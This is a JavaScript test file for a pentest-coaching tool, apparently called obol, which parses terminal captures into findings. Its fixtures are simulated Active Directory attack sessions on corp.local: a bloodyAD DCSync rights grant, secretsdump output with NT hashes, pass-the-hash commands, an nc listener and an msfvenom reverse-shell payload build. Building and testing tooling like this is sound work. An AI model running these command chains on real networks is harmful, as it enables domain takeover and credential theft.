/* Whole-session import: an operator pastes (or attaches) a full terminal capture — many commands and
 * their output at once — and obol catches up on the entire box in one pass. This proves the SPLITTER
 * carves the capture into correct per-command segments (handling the Kali two-line prompt, the obol
 * precmd time-stamp line, heredocs, and PowerShell), that multi-file captures stitch chronologically by
 * timestamp, that duplicates are dropped, and that the reconstructed segments drive the real parse→coach
 * pipeline to the same facts as if each had been pasted by hand. Generic data (corp.local) — validates
 * the PIPELINE, not any one lab. */
'use strict';
var fs = require('fs'), path = require('path'), vm = require('vm');
var ROOT = path.join(__dirname, '..', '..'), ENG = path.join(ROOT, 'assets', 'engine');
var ctx = { console: { log: function () {}, warn: function () {}, error: function () {} }, Promise: Promise };
ctx.globalThis = ctx; vm.createContext(ctx);
function load(f) { vm.runInContext(fs.readFileSync(f, 'utf8'), ctx, { filename: f }); }
['facts.js', 'phases.js', 'pack.js', 'packs.js', 'command.js', 'workspace.js'].forEach(function (f) { try { load(path.join(ENG, f)); } catch (e) {} });
load(path.join(ENG, 'parsers', 'common.js'));
['nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource'].forEach(function (m) { load(path.join(ENG, 'parsers', m + '.js')); });
load(path.join(ENG, 'parsers', 'index.js'));
load(path.join(ROOT, 'assets', 'ui', 'ingest.js'));
load(path.join(ROOT, 'data', 'packs-bundle.js'));
var OBOL = ctx.OBOL;

var fail = 0;
function ok(cond, msg) { if (!cond) { console.error('  FAIL:', msg); fail++; } else { console.log('  ok  :', msg); } }

// ── 1. splitSession carves a realistic multi-command capture into correct segments ──────────────────
// A Kali capture with obol's precmd stamp line above the two-line prompt, a couple of commands, a
// heredoc (whose body must NOT be read as more commands), and trailing output.
var cap = [
  '[2026-09-27 17:10:01 UTC] [tun0:10.10.14.5]',
  '┌──(kali㉿kali)-[~/engagements/dc01]',
  '└─$ nmap -Pn -p- 10.0.0.5',
  'Nmap scan report for 10.0.0.5',
  'Host is up.',
  'PORT   STATE SERVICE',
  '445/tcp open microsoft-ds',
  'Nmap done',
  '[2026-09-27 17:12:44 UTC] [tun0:10.10.14.5]',
  '┌──(kali㉿kali)-[~/engagements/dc01]',
  "└─$ cat > users.txt <<'EOF'",
  'jdoe',
  'svc-web',
  'EOF',
  '[2026-09-27 17:13:20 UTC] [tun0:10.10.14.5]',
  '┌──(kali㉿kali)-[~/engagements/dc01]',
  '└─$ nxc smb 10.0.0.5',
  'SMB 10.0.0.5 445 DC01 [*] Windows Server 2016 Build 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)',
].join('\n');

var segs = OBOL.ingest.splitSession(cap);
ok(segs.length === 3, 'splitSession finds exactly 3 commands (heredoc body is not mistaken for commands) — got ' + segs.length);
ok(segs[0].command === 'nmap -Pn -p- 10.0.0.5', 'segment 1 command is the nmap line');
ok(/Nmap scan report/.test(segs[0].stdout) && !/nxc smb/.test(segs[0].stdout), 'segment 1 stdout stops before the next command');
ok(segs[1].command === "cat > users.txt <<'EOF'", 'segment 2 command is the heredoc line');
ok(/jdoe\nsvc-web\nEOF/.test(segs[1].stdout), 'segment 2 swallows the heredoc body');
ok(segs[2].command === 'nxc smb 10.0.0.5', 'segment 3 command is the nxc line');
// the stamp line sits 2 rows above the └─$ command line → its timestamp is picked up
ok(segs[0].ts === Date.parse('2026-09-27T17:10:01Z'), 'segment 1 timestamp read from the precmd stamp line above the prompt');
ok(segs[2].ts === Date.parse('2026-09-27T17:13:20Z'), 'segment 3 timestamp read from its own stamp line');

// A bare "$ cmd" capture (no fancy prompt) still splits.
var bare = ['$ id', 'uid=0(root) gid=0(root)', '$ whoami', 'root'].join('\n');
var bs = OBOL.ingest.splitSession(bare);
ok(bs.length === 2 && bs[0].command === 'id' && bs[1].command === 'whoami', 'a plain "$ cmd" capture splits on the bare prompt');

// PowerShell prompt.
var ps = OBOL.ingest.splitSession(['PS C:\\Users\\svc> whoami', 'corp\\svc', 'PS C:\\Users\\svc> hostname', 'DC01'].join('\n'));
ok(ps.length === 2 && ps[0].command === 'whoami' && ps[1].command === 'hostname', 'a PowerShell capture splits on the PS ...> prompt');

// ── 2. importSession runs the segments through the real pipeline and mints the same facts ────────────
var store = (function () {
  var eng = { params: { target: '10.0.0.5', domain: 'corp.local' }, activities: [], facts: [] };
  var factSet = new OBOL.facts.FactSet([]);
  return {
    active: function () { return eng; },
    update: function (fn) { fn(eng); },
    addFacts: function (facts) { var n = 0; (facts || []).forEach(function (f) { if (factSet.add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) n++; }); return n; },
    factSet: function () { return factSet; },
    _facts: factSet,
  };
})();
OBOL.store = store;

var res = OBOL.ingest.importSession(cap);
ok(res.ok, 'importSession completes');
ok(res.commands === 3, 'importSession reports 3 commands');
ok(res.added > 0, 'importSession mints facts from the reconstructed segments (added=' + res.added + ')');
ok(store._facts.has('ports.open'), 'facts: the nmap segment minted ports.open');
ok(store._facts.has('ad.domain_known'), 'facts: the nxc smb segment minted the domain');
// the operator's LHOST was learned from the [tun0:…] stamp during import
ok(store.active().params.lhost === '10.10.14.5', 'importSession learns {{lhost}} from the [tun0:IP] stamp');
// one activity recorded per real command
ok(store.active().activities.length === 3, 'one activity recorded per imported command (heredoc included) — got ' + store.active().activities.length);

// ── 3. Multi-file stitch + de-dupe ──────────────────────────────────────────────────────────────────
// Two capture files whose commands interleave in time; importing both must order by timestamp and drop a
// command that appears (identically) in both.
var fileA = ['[2026-09-27 09:00:00 UTC] [tun0:10.10.14.5]', '└─$ nmap -Pn 10.0.0.5', 'Nmap scan report for 10.0.0.5', 'Host is up.'].join('\n');
var fileB = ['[2026-09-27 09:05:00 UTC] [tun0:10.10.14.5]', '└─$ nxc smb 10.0.0.5', 'SMB 10.0.0.5 445 DC01 [*] (domain:corp.local)',
  '[2026-09-27 09:00:00 UTC] [tun0:10.10.14.5]', '└─$ nmap -Pn 10.0.0.5', 'Nmap scan report for 10.0.0.5', 'Host is up.'].join('\n');
// fresh store
OBOL.store = (function () {
  var eng = { params: { target: '10.0.0.5', domain: 'corp.local' }, activities: [], facts: [] };
  var factSet = new OBOL.facts.FactSet([]);
  return { active: function () { return eng; }, update: function (fn) { fn(eng); },
    addFacts: function (facts) { var n = 0; (facts || []).forEach(function (f) { if (factSet.add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) n++; }); return n; },
    factSet: function () { return factSet; }, _e: eng };
})();
var multi = OBOL.ingest.importSession([fileA, fileB]);
ok(multi.commands === 3, 'multi-file: 3 raw command segments seen across both files');
ok(multi.dupes === 1, 'multi-file: the duplicate nmap run is detected and dropped (dupes=1)');
ok(multi.imported === 2, 'multi-file: exactly 2 unique commands imported');
ok(OBOL.store._e.activities.length === 2, 'multi-file: 2 activities recorded (no duplicate)');

// ── 4. detectTarget: route each command to the host it names, never the operator LHOST ───────────────
ok(OBOL.ingest.detectTarget('nxc smb 10.0.0.5 -u svc -p x', '', { lhost: '10.10.14.5' }) === '10.0.0.5', 'detectTarget reads the RHOST from an nxc command');
ok(OBOL.ingest.detectTarget("bloodyAD -d corp.local --host 10.0.0.9 -u svc -p x get writable", '', {}) === '10.0.0.9', 'detectTarget reads the --host argument');
ok(OBOL.ingest.detectTarget("impacket-secretsdump 'corp/svc:pw'@10.0.0.7", '', {}) === '10.0.0.7', 'detectTarget reads the impacket user:pass@host target');
ok(OBOL.ingest.detectTarget('coercer -t 10.0.0.5 -l 10.10.14.5', '', { lhost: '10.10.14.5' }) === '10.0.0.5', 'detectTarget picks the -t target, never the -l listener');
ok(OBOL.ingest.detectTarget('nc -lvnp 4444', '', { lhost: '10.10.14.5' }) === '', 'a listener command with no target routes nowhere (not the LHOST)');
ok(OBOL.ingest.detectTarget('', 'Nmap scan report for 10.0.0.8\nHost is up.', {}) === '10.0.0.8', 'detectTarget falls back to the host nmap names in its output');
ok(OBOL.ingest.detectTarget('some notes', 'nothing routable here', { lhost: '10.10.14.5' }) === '', 'detectTarget returns empty when no host is named');

// ── 5. importSession auto-routes a multi-host capture to the right hosts (and registers new ones) ─────
OBOL.store = (function () {
  var eng = { params: { domain: 'corp.local', target: '10.0.0.5', lhost: '10.10.14.5' }, targets: [{ id: 't1', ip: '10.0.0.5' }], activities: [], facts: [] };
  var byScope = {};
  function fs(scope) { return byScope[scope] || (byScope[scope] = new OBOL.facts.FactSet([])); }
  return {
    active: function () { return eng; }, update: function (fn) { fn(eng); },
    addFacts: function (facts) { var n = 0; (facts || []).forEach(function (f) { if (fs(f.scope).add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) n++; }); return n; },
    factSet: function () { return fs('host:' + eng.params.target); },
    _scoped: byScope, _e: eng,
  };
})();
var twoHost = [
  '[2026-09-27 10:00:00 UTC] [tun0:10.10.14.5]', '└─$ nxc smb 10.0.0.5',
  'SMB 10.0.0.5 445 DC01 [*] Windows Server 2016 Build 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)',
  '[2026-09-27 10:05:00 UTC] [tun0:10.10.14.5]', '└─$ nmap -Pn -p- 10.0.0.20',
  'Nmap scan report for 10.0.0.20', 'Host is up.', 'PORT STATE SERVICE', '445/tcp open microsoft-ds', 'Nmap done',
].join('\n');
var routed = OBOL.ingest.importSession(twoHost);
ok(routed.ok && routed.imported === 2, 'auto-route imports both commands');
ok(routed.hosts.indexOf('10.0.0.5') >= 0 && routed.hosts.indexOf('10.0.0.20') >= 0, 'auto-route reports facts landed on BOTH hosts');
ok(routed.hosts.indexOf('10.10.14.5') < 0, 'the operator LHOST is never reported as a host');
ok(OBOL.store._scoped['host:10.0.0.5'] && OBOL.store._scoped['host:10.0.0.5'].has('host.hostname'), 'the nxc host facts filed under 10.0.0.5');
ok(OBOL.store._scoped['host:10.0.0.20'] && OBOL.store._scoped['host:10.0.0.20'].has('ports.open'), 'the nmap facts filed under 10.0.0.20');
ok(!OBOL.store._scoped['host:10.10.14.5'], 'no facts were ever filed under the LHOST scope');
ok(OBOL.store._e.targets.some(function (t) { return t.ip === '10.0.0.20' && t.source === 'import'; }), 'the newly-touched host 10.0.0.20 was registered as a target');

// a FIXED target forces every command onto one host regardless of the IPs in the commands
OBOL.store._scoped['host:10.0.0.99'] = undefined;
var forced = OBOL.ingest.importSession(twoHost, { target: '10.0.0.99' });
ok(forced.hosts.length === 1 && forced.hosts[0] === '10.0.0.99', 'a fixed target routes every command to that one host');
ok(OBOL.store._scoped['host:10.0.0.99'] && OBOL.store._scoped['host:10.0.0.99'].has('ports.open') && OBOL.store._scoped['host:10.0.0.99'].has('host.hostname'),
  'with a fixed target, both commands\' facts file under the chosen host');

// ── 6. the Kali VM is never a target ─────────────────────────────────────────────────────────────────
// detectTarget with a self-IP set: even if the operator's own box appears as a command argument (they
// nmap'd their own IP, or ran a listener), it must not be routed to as a target.
ok(OBOL.ingest.detectTarget('nmap -Pn 10.10.14.9', '', { self: ['10.10.14.9'] }) === '', 'a scan of the operator\'s OWN VM IP routes nowhere (not a target)');
ok(OBOL.ingest.detectTarget('nxc smb 10.0.0.5', '', { self: ['10.10.14.9'] }) === '10.0.0.5', 'a real target beside a known self-IP still routes correctly');
ok(OBOL.ingest.detectTarget('ping 127.0.0.1', '', {}) === '', 'loopback is never a target');
ok(OBOL.ingest.detectTarget('nmap 169.254.1.1', '', {}) === '', 'a link-local address is never a target');
ok(OBOL.ingest.detectTarget('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=443 -f exe', '', {}) === '', 'the LHOST= value in a payload build is not a target');

// A full-import self-IP guard: an `ip a` interface dump reveals the box's own addresses; a later nmap of
// one of those must not create a Kali target. Fresh store.
OBOL.store = (function () {
  var eng = { params: { domain: 'corp.local', target: '10.0.0.5' }, targets: [{ id: 't1', ip: '10.0.0.5' }], activities: [], facts: [] };
  var byScope = {};
  function fs(scope) { return byScope[scope] || (byScope[scope] = new OBOL.facts.FactSet([])); }
  return { active: function () { return eng; }, update: function (fn) { fn(eng); },
    addFacts: function (facts) { var n = 0; (facts || []).forEach(function (f) { if (fs(f.scope).add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) n++; }); return n; },
    factSet: function () { return fs('host:' + eng.params.target); }, _scoped: byScope, _e: eng };
})();
var withSelf = [
  '└─$ ip a', '2: eth0: <BROADCAST> mtu 1500', '    inet 192.168.56.101/24 brd 192.168.56.255 scope global eth0',
  '4: tun0: <POINTOPOINT> mtu 1500', '    inet 10.10.14.9/23 scope global tun0',
  '└─$ nmap -Pn 192.168.56.101', 'Nmap scan report for 192.168.56.101', 'Host is up.', 'PORT STATE SERVICE', '22/tcp open ssh',
].join('\n');
var selfRes = OBOL.ingest.importSession(withSelf);
ok(selfRes.hosts.indexOf('192.168.56.101') < 0 && selfRes.hosts.indexOf('10.10.14.9') < 0, 'importing a session that scans the box\'s OWN eth0 IP never routes it as a host');
ok(!OBOL.store._e.targets.some(function (t) { return t.ip === '192.168.56.101' || t.ip === '10.10.14.9'; }), 'no Kali interface address was registered as a target');

// ── 7. reconcile a hostname-only target into the IP record ────────────────────────────────────────────
OBOL.store = (function () {
  var eng = { params: { domain: 'corp.local', target: '' }, targets: [{ id: 'manual', ip: '', hostname: 'DC01' }], activities: [], facts: [] };
  var byScope = {};
  function fs(scope) { return byScope[scope] || (byScope[scope] = new OBOL.facts.FactSet([])); }
  return { active: function () { return eng; }, update: function (fn) { fn(eng); },
    addFacts: function (facts) {
      var n = 0; (facts || []).forEach(function (f) { if (fs(f.scope).add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) n++; });
      // mirror the real store: keep a flat eng.facts list (reconcile reads it) + hostname sync onto IP targets
      eng.facts = []; Object.keys(byScope).forEach(function (sc) { byScope[sc].facts.forEach(function (f) { eng.facts.push(OBOL.facts.factToJson(f)); }); });
      var SUP = OBOL.facts.ProofState.SUPPORTED;
      eng.facts.map(OBOL.facts.factFromJson).forEach(function (f) {
        if ((f.kind === 'host.hostname' || f.kind === 'host.fqdn') && f.state === SUP && String(f.scope).indexOf('host:') === 0) {
          var ip = f.scope.slice(5), nm = String((f.value || {}).name || (f.value || {}).hostname || '').split('.')[0];
          if (nm) (eng.targets || []).forEach(function (tg) { if (tg.ip === ip && !tg.hostname) tg.hostname = nm; });
        }
      });
      return n;
    },
    factSet: function () { return fs('host:' + (eng.params.target || 'x')); }, _e: eng };
})();
// a capture that proves DC01 == 10.0.0.5 (nxc smb names the host)
var reconCap = ['└─$ nxc smb 10.0.0.5', 'SMB 10.0.0.5 445 DC01 [*] Windows Server 2016 Build 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)'].join('\n');
var rec = OBOL.ingest.importSession(reconCap);
var tgts = OBOL.store._e.targets;
ok(tgts.length === 1, 'the hostname-only card and the auto-created IP card collapse into ONE (got ' + tgts.length + ')');
ok(tgts[0].ip === '10.0.0.5' && String(tgts[0].hostname).toLowerCase() === 'dc01', 'the surviving card has both the IP and the hostname (' + tgts[0].ip + ' / ' + tgts[0].hostname + ')');
ok(rec.merged === 1, 'importSession reports 1 duplicate target merged');

// ── 8. IP remap for a reverted lab ────────────────────────────────────────────────────────────────────
var rm = OBOL.ingest.remapIps('nxc smb 10.129.95.66 -u svc\nSMB 10.129.95.66 445 ... [+] ok', [{ from: '10.129.95.66', to: '10.129.95.9' }]);
ok(rm.count === 2 && rm.text.indexOf('10.129.95.66') < 0 && rm.text.indexOf('10.129.95.9') >= 0, 'remapIps rewrites every occurrence of the old target IP');
// boundary: rewriting .6 must NOT touch .66 (no partial-IP corruption)
var rm2 = OBOL.ingest.remapIps('ping 10.129.95.6 ; ssh 10.129.95.66', [{ from: '10.129.95.6', to: '10.10.10.10' }]);
ok(rm2.count === 1 && /10\.129\.95\.66/.test(rm2.text) && /10\.10\.10\.10/.test(rm2.text), 'remapIps is IP-boundary safe (.6 does not match inside .66)');

// ── 9. THE user scenario: import a run.txt-style session WITHOUT the huge bloodyAD get-writable file, with a
// reverted-lab IP remap, and confirm obol still lands the win + surfaces the Administrator hash. This is the
// exact worry: the 50k-line ACL dump is absent, but the endgame gates on loot.ntds (from secretsdump), which
// IS in the capture — so the coach must still point at "Own the Domain — Pass-the-Hash as Administrator".
OBOL.store = (function () {
  var eng = { params: { domain: 'corp.local', target: '10.0.0.9', lhost: '10.10.14.191' }, targets: [{ id: 't1', ip: '10.0.0.9' }], activities: [], facts: [] };
  var all = new OBOL.facts.FactSet([]);
  return { active: function () { return eng; }, update: function (fn) { fn(eng); },
    addFacts: function (facts) { var n = 0; (facts || []).forEach(function (f) { if (all.add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) { n++; eng.facts.push(OBOL.facts.factToJson(f)); } }); return n; },
    factSet: function () { return all; }, _all: all, _e: eng };
})();
// the capture: AS-REP already cracked earlier; here it's the ACL-abuse grant + DCSync (NO get-writable dump),
// with the OLD ip (10.0.0.5) throughout — we remap it to the current target (10.0.0.9).
var runCap = [
  '[2026-09-27 22:28:34 UTC] [tun0:10.10.14.191]', "└─$ bloodyAD -d corp.local --host 10.0.0.5 -u svc -p 'pw' add dcsync svc",
  '[+] svc is now able to DCSync',
  '[2026-09-27 22:29:01 UTC] [tun0:10.10.14.191]', "└─$ impacket-secretsdump 'corp.local/svc:pw'@10.0.0.5",
  '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
  '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
  'corp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::',
  'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fa5f6f6f6f6f6f6f6f6f6f6f:::',
  '[*] Cleaning up...',
].join('\n');
var runRes = OBOL.ingest.importSession(runCap, { remap: [{ from: '10.0.0.5', to: '10.0.0.9' }] });
ok(runRes.remapped >= 2, 'the reverted-lab remap rewrote the old IP across the capture (' + runRes.remapped + ' occurrences)');
ok(OBOL.store._all.has('loot.ntds'), 'run.txt-minus-the-bloodyAD-file still mints loot.ntds (the win gates on this, present in secretsdump)');
ok(OBOL.store._all.has('ad.control_paths'), 'the DCSync grant is still recorded');
var ac = OBOL.store._all.values('credential.available').filter(function (v) { return String(v.user).toLowerCase() === 'administrator' && v.nthash === '32693b11e6aa90eb43d32c72a07ceea6'; });
ok(ac.length === 1, 'the Administrator hash is surfaced as a usable credential (shows on the cred cards)');
var ranked = OBOL.pack.nextActions(OBOL.store.factSet(), OBOL.packs.actions(), {});
ok(ranked.length && ranked[0].id === 'own-domain-pth', 'the coach\'s #1 move is "Own the Domain — Pass-the-Hash as Administrator" even without the ACL dump');
ok(!ranked.some(function (a) { return a.id === 'coerce-auth'; }), 'coercion is retired — not shown after the domain is owned');
// everything routed to the CURRENT target (remapped), not the stale one
ok(OBOL.store._e.activities.every(function (a) { return a.target === '10.0.0.9'; }) && !OBOL.store._e.targets.some(function (t) { return t.ip === '10.0.0.5'; }), 'all evidence routed to the current target; the stale IP never became a host');

// ── 10. Activate the credential we escalated WITH (not a hardcoded name, not the first cred) ───────────
ok(JSON.stringify(OBOL.ingest.credFromCommand('nxc smb 10.0.0.5 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6')) === JSON.stringify({ user: 'administrator', nthash: '32693b11e6aa90eb43d32c72a07ceea6' }), 'credFromCommand pulls -u + -H from a pass-the-hash command');
ok((OBOL.ingest.credFromCommand("nxc smb 10.0.0.5 -u svc -p 's3rvice' -d htb.local") || {}).password === 's3rvice', 'credFromCommand pulls -u + -p + -d from a password command');
ok(OBOL.ingest.credFromCommand("nxc smb 10.0.0.5 -u '' -p ''") === null, 'a null-session command is not a credential');
ok(OBOL.ingest.credFromCommand('nmap -Pn 10.0.0.5') === null, 'a command with no -u/secret yields no credential');
// escalationCred prefers the admin-validated command over a lesser one
var acts = [
  { command: "nxc smb 10.0.0.5 -u svc -p 's3rvice'", produced: ['smb.authenticated'] },
  { command: 'nxc smb 10.0.0.5 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6', produced: ['access.admin', 'smb.authenticated'] },
];
ok((OBOL.ingest.escalationCred(acts) || {}).user === 'administrator', 'escalationCred picks the ADMIN-validated command\'s identity, not the first one');

// end-to-end: importing a run that ends in an admin pass-the-hash validation activates administrator+hash
OBOL.store = (function () {
  var eng = { params: { domain: 'corp.local', target: '10.0.0.5' }, targets: [{ id: 't1', ip: '10.0.0.5' }], activities: [], facts: [] };
  var fs2 = new OBOL.facts.FactSet([]);
  return { active: function () { return eng; }, update: function (fn) { fn(eng); },
    addFacts: function (facts) { var n = 0; (facts || []).forEach(function (f) { if (fs2.add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) n++; }); return n; },
    factSet: function () { return fs2; }, _e: eng };
})();
var pwnCap = [
  '└─$ nxc smb 10.0.0.5 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6',
  'SMB 10.0.0.5 445 DC01 [*] Windows Server 2016 Build 14393 x64 (name:DC01) (domain:corp.local) (signing:True)',
  'SMB 10.0.0.5 445 DC01 [+] corp.local\\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)',
].join('\n');
OBOL.ingest.importSession(pwnCap);
ok(OBOL.store._e.params.username === 'administrator' && OBOL.store._e.params.nthash === '32693b11e6aa90eb43d32c72a07ceea6',
  'importing an admin pass-the-hash validation activates that identity (username + hash) for downstream fills');

console.log(fail ? ('\nSESSION IMPORT: ' + fail + ' FAILURES') : '\nSESSION IMPORT: all passed');
process.exit(fail ? 1 : 0);
